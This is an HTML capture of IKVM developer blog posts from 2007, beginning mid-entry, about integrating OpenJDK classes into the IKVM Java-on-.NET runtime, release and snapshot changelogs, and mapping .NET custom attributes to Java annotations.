color=#0000ff>getBootstrapResources</FONT>" <FONT color=#ff0000>sig</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>(Ljava.lang.String;)Ljava.util.Enumeration;</FONT>" /&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<FONT color=#a31515>ret </FONT>/&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;/<FONT color=#a31515>body</FONT>&gt;<BR>&nbsp; &lt;/<FONT color=#a31515>method</FONT>&gt;<BR>&lt;/<FONT color=#a31515>class</FONT>&gt;</P></CODE>
<P>These method bodies simply call the real implementations in <CODE>LangHelper</CODE>, because it's obviously easier to implement them in Java than in CIL.</P>
<P>3. Change the code (i.e. fork a specific source file)</P>
<P>In some cases, the changes required are so substantial that the map.xml trickery doesn't work or isn't practical. For an example of that we need to look at how reflection is implemented in OpenJDK.</P>
<P>Here's a fragment of <CODE>java.lang.reflect.Method</CODE> (not the actual code, but it gets the idea across):</P><CODE>
<P><FONT color=#0000ff>package</FONT> java.lang.reflect;</P>
<P><FONT color=#0000ff>public final class </FONT><FONT color=#2b91af>Method</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>private static final </FONT><FONT color=#2b91af>ReflectionFactory</FONT> reflectionFactory = (<FONT color=#2b91af>ReflectionFactory</FONT>)<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>AccessController</FONT>.doPrivileged(<FONT color=#0000ff>new </FONT>sun.reflect.<FONT color=#2b91af>ReflectionFactory</FONT>.<FONT color=#2b91af>GetReflectionFactoryAction</FONT>());<BR>&nbsp; <FONT color=#0000ff>private </FONT><FONT color=#2b91af>MethodAccessor</FONT> methodAccessor;<BR><BR>&nbsp; <FONT color=#0000ff>public </FONT><FONT color=#2b91af>Object </FONT>invoke(<FONT color=#2b91af>Object </FONT>obj, <FONT color=#2b91af>Object</FONT>... args)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#008000>// ... access checks omitted ...<BR></FONT>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>if </FONT>(methodAccessor == <FONT color=#0000ff>null</FONT>)<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; methodAccessor = reflectionFactory.newMethodAccessor(<FONT color=#0000ff>this</FONT>);<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return </FONT>methodAccessor.invoke(obj, args);<BR>&nbsp; }<BR>}</P></CODE>
<P>So the actual method invocation is delegated to an object that implements the <CODE>MethodAccessor</CODE> interface. By default Sun's <CODE>ReflectionFactory</CODE> returns an object that counts the number of invocations and delegates to another <CODE>MethodAccessor</CODE> object that uses JNI to use the VM reflection infrastructure, if the invocation counter crosses a certain value the inner object is replaced by an instance of a dynamically generated class that contains custom generated byte codes to efficiently call the target method (and this generated bytecode is not verifiable, so it won't work as-is on IKVM). In this case I've decided to fork <CODE>ReflectionFactory</CODE> and implement my own version that simply returns <CODE>MethodAccessor</CODE> instances that reuse the IKVM reflection infrastructure.</P>
<P>The cost of forking a source file should be obvious. When improvements are made to the original, you don't automatically inherit these. In this particular case <CODE>ReflectionFactory</CODE> is a fairly small and simple class (all of the complexity is in the classes it calls), so the risk seems low.</P>
<P><B>Structural Issues</B></P>
<P>Besides the issues already pointed out, there are also things of a more structural nature. A good example can again be found in <CODE>java.lang.reflect.Method</CODE>. Here's its constructor:</P><CODE>
<P>Method(<FONT color=#2b91af>Class</FONT> declaringClass,<BR><FONT color=#2b91af>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String</FONT> name,<BR><FONT color=#2b91af>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Class</FONT>[] parameterTypes,<BR><FONT color=#2b91af>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Class </FONT>returnType,<BR><FONT color=#2b91af>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Class</FONT>[] checkedExceptions,<BR><FONT color=#0000ff>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int</FONT> modifiers,<BR><FONT color=#0000ff>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int</FONT> slot,<BR><FONT color=#2b91af>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String</FONT> signature,<BR><FONT color=#0000ff>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte</FONT>[] annotations,<BR><FONT color=#0000ff>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte</FONT>[] parameterAnnotations,<BR><FONT color=#0000ff>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte</FONT>[] annotationDefault)<BR>{<BR>&nbsp; <FONT color=#008000>// ...<BR></FONT>}</P></CODE>
<P>The constructor expects the generics signature and annotations to be passed in. This poses a dillema. On IKVM looking up the custom attributes that contain this data is relatively expensive and in many cases a method object may be constructed while the code is not interested in generics information or annotations at all, so it might be more desireable to lazily get this data. Another problem is that the annotations are passed in as byte arrays that contain the annotation data as it exists in the class file. Code compiled with ikvmc obviously doesn't have a class file. Despite these two issues, I've chosen to not fork <CODE>Method</CODE>. At the moment I think that the performance cost of eagerly getting the generics signature and the annotations is an acceptable trade-off for not having to fork <CODE>Method</CODE>. Currently, the way annotations are handled is pretty horrible, because I've left the existing annotation mechanisms in place and reuse the stub class generator code to recreate the annotation byte arrays (and the corresponding constant pool entries) on the fly to pass them into the <CODE>Method</CODE> constructor. I've got some ideas to change annotation storage in ikvmc compiled code to use a mechanism that's more compatible with this approach and that may ultimately turn out to be more space efficient as well.</P>
<P><B>Compatibility</B></P>
<P>One aspect I haven't talked about yet is compatibility. For example, there's code out there that directly uses <A href="http://www.google.com/search?hl=en&amp;q=reflectionfactory.getReflectionFactory">ReflectionFactory</A>. This is evil, but it's also reality. So I try to weigh the compability impact as well when I'm trying to find the right approach.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/04/2007 10:46:34 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1d6c7b8e-f0bb-4c1a-be11-f51116c44326"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1d6c7b8e-f0bb-4c1a-be11-f51116c44326">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 31 May 2007</h2></div>
<div class="newsItems"><a name="a1406bcfa-1957-4114-9c63-4a8f70d750ac"></a><div class="entry">
	<h3 class="entryTitle">First Hybrid OpenJDK / GNU Classpath Snapshot</h3>
	<div class="entryBody">
		<P>The first step on a long journey. I've integrated OpenJDK's <CODE>java.lang.reflect.*</CODE> a few classes from <CODE>java.lang.*</CODE> and a whole bunch of <CODE>sun.*</CODE> support classes. Take a look at <A href="http://ikvm.cvs.sourceforge.net/ikvm/ikvm/openjdk/allsources.lst?revision=1.3&amp;view=markup">allsources.lst</A> to see which sources are used from where. I'll try to write a detailed blog entry discussing the various integration points (and answering the questions asked <A HREF="/CommentView.aspx?guid=e6e4a958-b179-4361-b053-502be42b0c51">here</A>) over the weekend.</P>
<P>Other changes:</P>
<UL>
<LI>Added some conditionally compiled code to work around .NET 2.0 obsoletion warnings.</LI>
<LI>Optimized lcmp, fcmpl, fcmpg, dcmpl and dcmpg bytecodes (by Dennis Ushakov).</LI>
<LI>Fixed ikvmc not to crash if map.xml doesn't contain any &lt;class&gt; entries.</LI>
<LI>Various refactorings to make OpenJDK integration easier.</LI></UL>
<P>Known regressions:</P>
<UL>
<LI>System class loader is not set correct for ikvmc compiled code.</LI></UL>
<P>This is based on OpenJDK drop b12, which appears not to be available for download anymore. The ikvm changes are in cvs. The snapshot binaries are available here: <A href="http://www.frijters.net/ikvmbin-hybrid-0.35.2707.zip">ikvmbin-hybrid-0.35.2707.zip</A>.</P>
<P>As always, snapshots are not intended to be used in production, only for testing and getting a flavor of where development is going.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/31/2007 16:08:38 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1406bcfa-1957-4114-9c63-4a8f70d750ac"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1406bcfa-1957-4114-9c63-4a8f70d750ac">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 30 May 2007</h2></div>
<div class="newsItems"><a name="abb557a8f-87d2-42fc-b34c-3428c69386b2"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.34 Update</h3>
	<div class="entryBody">
		<P>I've made an updated 0.34 release that includes the most important fixes I've done in the last couple of weeks.</P>
<P>Changes:</P>
<UL>
<LI>Fixed exception mapping memory leak.</LI>
<LI>Fixed verifier/compiler to support dup_x2 form 2.</LI>
<LI>Fixed for ArrayIndexOutOfBoundsException in generic metadata reflection on dynamically compiled types.</LI>
<LI>Fixed infinite recursion bug when DotNetTypeWrapper.GetName() was used on DerivedType where DerivedType extends BaseType&lt;DerivedType&gt;.</LI>
<LI>Fixed ikvmc generic .NET type loading bug.</LI>
<LI>Fixed Throwable.printStackTrace() to call Throwable.printStackTrace(OutputStream) to support exception classes that only override printStackTrace(OutputStream). </LI>
<LI>Fixed Throwable.printStackTrace(&#8230;) to use PrintWriter/PrintStream.println() to trigger flushing on auto-flush writers/streams. </LI>
<LI>Fixed Throwable constructor to set cause correctly if an exception was instantiated but not thrown immediately. </LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.34.0.3.zip"><STRONG>ikvm-0.34.0.3.zip</STRONG></A> (source + binaries) and <A href="http://www.frijters.net/ikvmbin-0.34.0.3.zip"><STRONG>ikvmbin-0.34.0.3.zip</STRONG></A> (binaries).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/30/2007 14:33:14 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=bb557a8f-87d2-42fc-b34c-3428c69386b2"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=bb557a8f-87d2-42fc-b34c-3428c69386b2">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 21 May 2007</h2></div>
<div class="newsItems"><a name="a76a23928-a1bd-4b20-9da5-8ebc46478c2f"></a><div class="entry">
	<h3 class="entryTitle">Case Studies</h3>
	<div class="entryBody">
		<P>A while ago I gave a talk about IKVM at WL | Delft Hydraulics and I convinced them to describe how they use IKVM, for a <A href="http://www.ikvm.net/stories.html">case study</A> on the&nbsp;IKVM website. My thanks to Fedor and David for taking the time to do this.</P>
<P>If you or your company uses IKVM and would like to write about it for publication on the&nbsp;IKVM website, I would appreciate it very much. Please contact me by e-mail at <A href="mailto:jeroen@frijters.net">jeroen@frijters.net</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/21/2007 17:41:19 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=76a23928-a1bd-4b20-9da5-8ebc46478c2f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=76a23928-a1bd-4b20-9da5-8ebc46478c2f">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 11 May 2007</h2></div>
<div class="newsItems"><a name="ae6e4a958-b179-4361-b053-502be42b0c51"></a><div class="entry">
	<h3 class="entryTitle">Merging the First OpenJDK Code and Another x64 CLR Bug</h3>
	<div class="entryBody">
		<P>While working on integrating Sun's recently GPLed code to parse and toString floats and doubles (so that this long standing IKVM bug can finally be fixed) I ran into another <A href="https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=276714">x64 CLR bug</A>, this time in the JIT. It was a little bit disturbing to see a Double.parseDouble() test fail with the Sun code that previously worked with my lame and hacked up parsing code, but fortunately the workaround was easy. The IKVM bytecode compiler now obfuscates any <CODE>-0.0</CODE> literals it encounters to prevent the x64 JIT from "optimizing" them.</P>
<P>On a more general note, I haven't yet figured out how to go about integrating the whole of OpenJDK, but I have discovered it'll be quite a bit of work. For every class that uses native code to interface with the VM I'll have to decide whether to implement the existing native methods in C#, implement them in map.xml or rewrite the class to add IKVM specific code. Each option has different trade-offs, for example while it sucks to fork a class due to the added work of merging in changes, adding the required IKVM specific modifications inline is often the cleanest and most efficient way of implementing the required functionality.</P>
<P>I think I'm going to dip my toe into the water by changing my java.lang.reflect.* classes, which are currently modified versions of the GNU Classpath classes, into versions derived from the Sun code.</P>
<P>One final note. The OpenJDK is supposedly licensed under the GPL + "Classpath" exception, but the license text says that only files that explicitly opt-in to the "Classpath" exception are covered by the exception. That implies that I'll have to examine each source file to make sure it is covered, before including it with IKVM.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/11/2007 16:17:15 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e6e4a958-b179-4361-b053-502be42b0c51"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e6e4a958-b179-4361-b053-502be42b0c51">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 09 May 2007</h2></div>
<div class="newsItems"><a name="a2ce3b79f-45c6-4c85-bdb9-c1a2f386c73f"></a><div class="entry">
	<h3 class="entryTitle">Custom Attribute Annotations</h3>
	<div class="entryBody">
		<P>Custom attributes are a powerful capability of the .NET Framework and unlike Java annotations, there are quite a few custom attributes that are understood directly by the CLR runtime engine, for example things like P/Invoke, declarative Code Access Security and declaring thread or context local static variables can all be done by applying custom attributes. In addition to this there are also lots of reflection based applications of custom attributes because they've been part of the platform since day one.</P>
<P>Because of the importance of custom attributes, it makes sense to try to support them in ikvm. It has been possible for quite a while to apply custom attributes to Java classes, methods and fields by specifying them in the map.xml file and previously I used this when compiling IKVM.GNU.Classpath.dll in a few places (e.g. for declaring a thread local static variable), but given the similarity between custom attributes and Java annotations (which, like many other Java 5 features, were obviously "inspired" by .NET) it only makes sense to try to map custom attributes to annotations whenever possible.</P>
<P>I started working on this a while ago and recently checked in major improvements to this. The feature is now started to take shape nicely.</P>
<P><B>Limitations</B></P>
<P>Although conceptually very similar, there are significant differences between .NET custom attributes and Java annotations. The most important one is that custom attributes are classes while annotations are interfaces, as a direct result of that custom attributes use a constructor invocation syntax (plus the ability to set fields and properties), while annotations just name the type and list a number of key/value pairs (very similar to custom attribute properties). This means that in .NET, a custom attribute can specify which parameters are required and which are optional, by making the required parameters constructor arguments and the optional ones properties (or fields) and additionally, because of constructor overloading multiple combinations are possible. Annotation can specify for each individual property if it is required or optional, but there is no mechanism similar to constructor overloading.</P>
<P>This leads to the first limitation: Currently only custom attributes that have a default constructor or a single one-argument constructor (taking a supported type) are supported.</P>
<P>The second limitation is that not all parameter types are supported, only the Java primitive types (where Java's byte maps to System.Byte), type literals, strings and enumerations are supported (and single dimensional arrays of these types). Custom attribute parameters typed as Object are not supported.</P>
<P><B>Nested Annotation Type</B></P>
<P>When viewed from Java, every supported custom attribute class will appear to have a nested annotation type named <CODE>Annotation</CODE>. Here's an example of applying a simple custom attribute annotation to a field:</P>
<P><CODE><FONT color=#0000ff>public</FONT> <FONT color=#0000ff>class</FONT> Foo<BR>{<BR>&nbsp; @cli.System.<FONT color=#2b91af>ThreadStaticAttribute</FONT>.<FONT color=#2b91af>Annotation</FONT><BR>&nbsp; <FONT color=#0000ff>private static int</FONT> threadLocalCounter;<BR>}</CODE></P>
<P>I toyed with the idea of naming the annotation by chopping of the Attribute part, to make it consistent with common C# usage, but I ultimately I decided the nested type approach was better. It's a bit more verbose, but it's consistent with how delegates are handled and it greatly reduces the chance of name clashes.</P>
<P><B>Single Argument Constructor</B></P>
<P>If a custom attribute has a single argument constructor, that will be translated into an annotation property named <CODE>value</CODE>. This allows the simplified syntax to be used:</P>
<P><CODE>@cli.System.<FONT color=#2b91af>CLSCompliantAttribute</FONT>.<FONT color=#2b91af>Annotation</FONT>(<FONT color=#0000ff>true</FONT>)<FONT color=#2b91af><BR></FONT><FONT color=#0000ff>public</FONT> <FONT color=#0000ff>class</FONT> Foo { ... }</CODE></P>
<P>If the custom attribute also has a default constructor, the <CODE>value</CODE> property will be optional.</P>
<P><B>Enums</B></P>
<P>Since .NET enums are value types and behave like integral types most of the time, they are not mapped to Java enums, but for use in annotations they have to be mapped to Java enums, so every .NET enum type has a nested type __Enum that is a Java enum. This allows enum values to be used in annotations:</P>
<P><CODE><FONT color=#0000ff>import</FONT> cli.System.*;<BR><BR>@<FONT color=#2b91af>AttributeUsageAttribute</FONT>.<FONT color=#2b91af>Annotation</FONT>({<BR><FONT color=#2b91af>&nbsp; AttributeTargets</FONT>.<FONT color=#2b91af>__Enum</FONT>.Class,<BR><FONT color=#2b91af>&nbsp; AttributeTargets</FONT>.<FONT color=#2b91af>__Enum</FONT>.Interface<BR>})<BR><FONT color=#0000ff>public class</FONT> MyCustomAttribute <FONT color=#0000ff>extends</FONT> <FONT color=#2b91af>Attribute</FONT><BR>{ ... }</CODE></P>
<P>The above example also shows that an enum that has a <A href="http://msdn2.microsoft.com/en-us/library/system.flagsattribute.aspx">FlagsAttribute</A> (as <A href="http://msdn2.microsoft.com/en-us/library/system.attributetargets.aspx">AttributeTargets</A> does) will be translated into an array of that enum, to allow combining the flags. The exception to this is that if the parameter type is already an array, it will not be turned into a two dimensional array, because annotations only support one dimensional arrays.</P>
<P><B>ValidOn &amp; AllowMultiple</B></P>
<P>Custom attribute annotations are annotated with the <A href="http://java.sun.com/javase/6/docs/api/java/lang/annotation/Target.html">Target</A> and <A href="http://java.sun.com/javase/6/docs/api/java/lang/annotation/Retention.html">Retention</A> annotations. The target element types are based on the <A href="http://msdn2.microsoft.com/en-us/library/system.attributeusageattribute.validon.aspx">ValidOn</A> property of the <A href="http://msdn2.microsoft.com/en-us/library/system.attributeusageattribute.aspx">AttributeUsageAttribute</A> of the custom attribute and Retention always has a <A href="http://java.sun.com/javase/6/docs/api/java/lang/annotation/RetentionPolicy.html#RUNTIME">RetentionPolicy.RUNTIME</A>.</P>
<P>The ValidOn property of AttributeUsageAttribute is of type AttributeTargets. Here's a table that shows how the values map to the Java ElementType enum:</P>
<TABLE cellSpacing=0 border=0>
<TBODY>
<TR>
<TD><B>System.AttributeTargets</B></TD>
<TD><B>java.lang.annotation.ElementType</B></TD></TR>
<TR bgColor=#f0f0f0>
<TD>Assembly, Class, Delegate, Enum, Interface, Struct&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD>TYPE</TD></TR>
<TR>
<TD>Constructor</TD>
<TD>CONSTRUCTOR</TD></TR>
<TR bgColor=#f0f0f0>
<TD>Method</TD>
<TD>METHOD</TD></TR>
<TR>
<TD>Field</TD>
<TD>FIELD</TD></TR>
<TR bgColor=#f0f0f0>
<TD>Parameter</TD>
<TD>PARAMETER</TD></TR></TBODY></TABLE><BR>
<P>Unlike custom attributes, annotations cannot be applied to a method's return value. The workaround for that is to nest them inside a special __ReturnValue annotation that is applied to the method:</P>
<P><CODE><FONT color=#0000ff>public</FONT> <FONT color=#0000ff>class</FONT> Foo<BR>{<BR>&nbsp; @cli.System.<FONT color=#2b91af>CLSCompliantAttribute</FONT>.<FONT color=#2b91af>Annotation</FONT>.<FONT color=#2b91af>__ReturnValue</FONT>(<BR>&nbsp;&nbsp;&nbsp;&nbsp; @cli.System.<FONT color=#2b91af>CLSCompliantAttribute</FONT>.<FONT color=#2b91af>Annotation</FONT>(<FONT color=#0000ff>true</FONT>)<BR>&nbsp; )<BR>&nbsp; <FONT color=#0000ff>public int</FONT> foo() { ... }<BR>}</CODE></P>
<P>Another custom attribute feature not supported by annotations is the ability to specify multiple instances of a custom attributes (controlled by the <A href="http://msdn2.microsoft.com/en-us/library/system.attributeusageattribute.allowmultiple.aspx">AllowMultiple</A> property of AttributeUsageAttribute). This is handled in a similar way:</P>
<P><CODE><FONT color=#0000ff>import </FONT>cli.System.Security.Permissions.*;<FONT color=#0000ff><BR><BR></FONT>@<FONT color=#2b91af>UIPermissionAttribute</FONT>.<FONT color=#2b91af>Annotation</FONT>.<FONT color=#2b91af>__Multiple</FONT>({<BR>&nbsp; @<FONT color=#2b91af>UIPermissionAttribute</FONT>.<FONT color=#2b91af>Annotation</FONT>(value = <FONT color=#2b91af>SecurityAction</FONT>.<FONT color=#2b91af>__Enum</FONT>.Demand,<BR>&nbsp;&nbsp;&nbsp; Window = <FONT color=#2b91af>UIPermissionWindow</FONT>.<FONT color=#2b91af>__Enum</FONT>.SafeTopLevelWindows),<BR>&nbsp; @<FONT color=#2b91af>UIPermissionAttribute</FONT>.<FONT color=#2b91af>Annotation</FONT>(value = <FONT color=#2b91af>SecurityAction</FONT>.<FONT color=#2b91af>__Enum</FONT>.LinkDemand,<BR>&nbsp;&nbsp;&nbsp; Clipboard = <FONT color=#2b91af>UIPermissionClipboard</FONT>.<FONT color=#2b91af>__Enum</FONT>.AllClipboard)<BR>})<BR><FONT color=#0000ff>public class</FONT> Foo { ... }</CODE></P>
<P>Note that __Multiple is never nested inside a __ReturnValue, when a custom attribute has AllowMultiple and can be applied to return values, the __ReturnValue annotation simply has an array value property.</P>
<P><B>Type Literals</B></P>
<P>Type literals can be specified as class literals:</P>
<P><CODE><FONT color=#0000ff>import</FONT> cli.System.Runtime.CompilerServices.*;<BR><BR>@<FONT color=#2b91af>TypeForwardedToAttribute</FONT>(<FONT color=#2b91af>Foo</FONT>.<FONT color=#0000ff>class</FONT>)<BR><FONT color=#0000ff>interface</FONT> assembly {}</CODE></P>
<P>Note that the assembly type in the default package is treated specially by ikvm and acts as a placeholder for custom attributes that should be applied to the assembly.</P>
<P><B>Default Values</B></P>
<P>This table lists the default values for each supported type:</P>
<TABLE cellSpacing=0 border=0>
<TBODY>
<TR>
<TD><B>Type</B></TD>
<TD><B>Default Value</B></TD></TR>
<TR bgColor=#f0f0f0>
<TD>boolean&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD><CODE>false</CODE></TD></TR>
<TR>
<TD>byte</TD>
<TD><CODE>(byte)0</CODE></TD></TR>
<TR bgColor=#f0f0f0>
<TD>char</TD>
<TD><CODE>(char)0</CODE></TD></TR>
<TR>
<TD>short</TD>
<TD><CODE>(short)0</CODE></TD></TR>
<TR bgColor=#f0f0f0>
<TD>int</TD>
<TD><CODE>0</CODE></TD></TR>
<TR>
<TD>float</TD>
<TD><CODE>0.0F</CODE></TD></TR>
<TR bgColor=#f0f0f0>
<TD>long</TD>
<TD><CODE>0L</CODE></TD></TR>
<TR>
<TD>double</TD>
<TD><CODE>0.0D</CODE></TD></TR>
<TR bgColor=#f0f0f0>
<TD>String</TD>
<TD><CODE>""</CODE></TD></TR>
<TR>
<TD>Class</TD>
<TD><CODE>ikvm.internal.__unspecified.class</CODE></TD></TR>
<TR bgColor=#f0f0f0>
<TD>Enum</TD>
<TD><CODE>__unspecified</CODE></TD></TR>
<TR>
<TD>array</TD>
<TD><CODE>{ }</CODE></TD></TR></TBODY></TABLE><BR>
<P>The __unspecified hacks are necessary because annotation property values cannot be <CODE>null</CODE>. Every __Enum has an __unspecified field specifically for this purpose. Note that these defaults do not necessarily correspond to the real default values used by the custom attribute. These are simply the values that are reported by <A href="http://java.sun.com/javase/6/docs/api/java/lang/reflect/Method.html#getDefaultValue()">Method.getDefaultValue()</A> and put into the stubs generated by ikvmstub. If you don't specify a value for an optional property, the resulting custom attribute won't have the property set and hence it will have the default value as defined by the implementation of the custom attribute.</P>
<P><B>Error Handling</B></P>
<P>Not yet implemented, but the idea is to ignore invalid annotations (most likely due to version conflicts between the stub jar that the Java code was compiled against and the assembly used at runtime). In the case of ikvmc, a warning message should be emitted as well.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/09/2007 08:15:26 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2ce3b79f-45c6-4c85-bdb9-c1a2f386c73f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2ce3b79f-45c6-4c85-bdb9-c1a2f386c73f">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a60c23c54-c4f7-42fa-b297-23c816cd49c8"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>I expect that I'll be busy the next couple of weeks working on integrating&nbsp;the OpenJDK libraries that were released yesterday, so I thought I'd release a new development snapshot to reflect the current state. There are quite a few bug fixes, most of them triggered by running test suites suggested by Albert Strasheim. Many thanks to him for running the test suites and passing the interesting ones on to me (including instructions on how to install/build/run them, which is&nbsp;usually the most time consuming and frustrating part.)</P>
<P>This snapshot also includes much improved support for applying .NET custom attributes as Java annotations. The next blog entry will describe the changes in detail.</P>
<P>Changes:</P>
<UL>
<LI>Integrated current GNU Classpath cvs version. </LI>
<LI>Fixed exception handling to continue working during AppDomain finalization for unload.</LI>
<LI>Implement major chunk of custom attribute as annotations support.</LI>
<LI>Added support for applying custom attributes to return values.</LI>
<LI>Added support for applying AllowMultiple custom attributes multiple times to the same element.</LI>
<LI>Restructured ParameterBuilder handling.</LI>
<LI>Added system property "ikvm.apartmentstate" to enable setting the COM ApartmentState for threads created in Java code.</LI>
<LI>Added hack to support Double.MIN_VALUE and Double.MAX_VALUE toString/parse roundtripping.</LI>
<LI>Fixed Throwable.printStackTrace() to call Throwable.printStackTrace(OutputStream) to support exception classes that only override printStackTrace(OutputStream).</LI>
<LI>Fixed Throwable.printStackTrace(&#8230;) to use PrintWriter/PrintStream.println() to trigger flushing on auto-flush writers/streams.</LI>
<LI>Fixed Throwable constructor to set cause correctly if an exception was instantiated but not thrown immediately.</LI>
<LI>Moved ikvmc warning handling to fix missing warnings bug (previously depending on compilation order, some warnings might not be shown).</LI>
<LI>Fixed verifier/compiler to support dup_x2 form 2. Found by Derby test suite.</LI>
<LI>Implemented JSR 133 rule that says that finalize cannot run before constructor is finished.</LI>
<LI>Fixed ArrayIndexOutOfBoundsException in generic metadata reflection on dynamically compiled types.</LI>
<LI>Fixed PlainDatagramSocketImpl to set initial SO_BROADCAST option to enabled.</LI>
<LI>Fixed PlainSocketImpl.getOption(SO_OOBLINE) to return Boolean instead of Integer.</LI>
<LI>Fixed DatagramChannelImpl to reflect connectedness on underlying DatagramSocket.</LI>
<LI>Fixed SocketChannelImpl.read(ByteBuffer) to handle -1 return values from implRead() for non byte array backed buffers.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.35.2685.zip">ikvmbin-0.35.2685.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/09/2007 08:13:44 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=60c23c54-c4f7-42fa-b297-23c816cd49c8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=60c23c54-c4f7-42fa-b297-23c816cd49c8">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 05 May 2007</h2></div>
<div class="newsItems"><a name="a84dac970-f23c-4fb4-8186-2556f721981a"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.34 Released</h3>
	<div class="entryBody">
		<P>I released 0.34.0.2 to <A href="http://sourceforge.net/project/showfiles.php?group_id=69637"><STRONG>SourceForge</STRONG></A> (same bits as rc3).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/05/2007 09:35:10 (W. Europe Daylight Time, UTC+02:00)&nbsp;
